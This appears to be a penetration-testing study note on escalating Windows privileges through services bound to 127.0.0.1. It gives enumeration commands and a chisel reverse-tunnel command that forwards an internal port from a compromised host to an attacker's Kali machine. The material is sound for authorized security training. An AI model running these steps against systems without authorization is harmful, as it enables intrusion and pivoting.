A service bound to `127.0.0.1` is invisible from the network but reachable from your shell. It is a *clue*, not a win - pursue it only when its identity or function suggests an escalation.

## Goal
Turn a loopback-only listener into a justified local escalation or credential hypothesis - without drifting into AD or general network pivoting.

## Tips
Localhost-only means "not exposed", not "vulnerable" and not "privilege escalation". The path still needs an exploitable / admin function, credential reuse, unsafe local trust, or another proven route to a higher-privileged context. Test locally first; only tunnel to Kali when running the exploit there is materially easier. Port forwarding is not AD-only, but this note stays on the compromised standalone host.

> Platform-neutral listener → PID → owner → product mapping and the tunnel decision gate live in [[internal_port_enum]]; multi-host/subnet pivoting (SSH `-L`/`-D`/`-R`, chisel SOCKS, ligolo) lives in [[pivoting_and_tunnelling]]. This note keeps only the Windows-local nuance.

Checklist:
- [ ] a `127.0.0.1:<port>` listener that isn't exposed externally?
- [ ] mapped PID → process / service → owning account?
- [ ] does that service run with more privilege than me?
- [ ] product + version + auth identified?

# Commands

### Step 1: find loopback listeners + owner
```batch
netstat -ano | findstr LISTENING       :: note 127.0.0.1:<port> + PID
tasklist /fi "PID eq <PID>"            :: PID -> process
```
```powershell
Get-NetTCPConnection -State Listen | ? LocalAddress -in '127.0.0.1','::1' | Select LocalPort,OwningProcess
Get-CimInstance Win32_Service | ? ProcessId -eq <PID> | Select Name,StartName   # -> owning account
```

### Step 2: fingerprint locally
```text
identify protocol / product / version / auth from the port + owning process.
try it locally first: a local admin panel, a DB with default/known creds, an RPC endpoint.
```

## Exploit

### Case 1: Attack it locally
If the local service exposes an admin function, default / known creds, or a known exploit, **and** it runs with higher privilege than you, use it in place. Reuse any password you already found ([[05_stored_credentials]]).
**Verify:** whatever code path you triggered → `whoami` in the result.

### Case 2: Forward to Kali (only if it's materially easier)
When the exploit is easier to run from Kali, forward the internal port. Verify the **tunnel** and the **service** separately - a working tunnel to a service that rejects you is still a dead end.
```bash
./chisel server -p 8080 --reverse                             # on Kali
```
```batch
chisel.exe client <KALI_IP>:8080 R:<LPORT>:127.0.0.1:<PORT>   :: on the target
```
Transfer `chisel.exe` first → [[01_orientation#File transfer - Kali to Windows|file transfer]]. [chisel](https://github.com/jpillora/chisel) - reverse TCP tunnel (alternatively PuTTY/Plink for SSH forwarding).
**Dead end / pivot:** service reachable but not exploitable, or no higher privilege → it was only a clue; pivot.

## Correcting common misconceptions
- A local-only listener is an **attack-surface clue**, not an escalation by itself.
- Port forwarding is **not** AD-only - but this note stays on the compromised host; broader network pivoting belongs to [[pivoting_and_tunnelling]].

## Helpline:
1. PID → account
```
netstat -ano                              -> LocalAddress:Port + PID
tasklist /fi "PID eq <PID>"               -> process name
Get-CimInstance Win32_Service | ? ProcessId -eq <PID>   -> service + StartName (the account)
```

2. Verify a tunnel and its target separately
```
tunnel up?  -> can Kali reach 127.0.0.1:<PORT> through the forward at all?
service ok? -> does the service actually accept your request / creds?
both must be true.
```
